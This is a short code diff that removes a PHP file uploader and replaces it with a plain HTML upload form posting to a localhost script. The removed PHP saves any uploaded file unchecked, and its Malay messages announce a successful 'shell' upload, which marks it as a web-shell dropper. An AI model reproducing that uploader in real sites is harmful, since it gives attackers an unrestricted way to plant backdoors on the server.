@@ -1,8 +1,12 @@
-<?php
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
-else { echo '<b>Korang Gagal Upload Shell Korang!!!</b><br><br>'; }
-}
-?>
+
+<html>
+<head></head>
+<body>
+<form action = "http://localhost/new_upload.php" method = "post" enctype = "multipart/form-data">
+<br><br>
+Choose the file to upload<br>
+<input type = "file" name = "file"><br>
+<input type = "submit" name = "submit">
+</form>
+</body>
+<html>
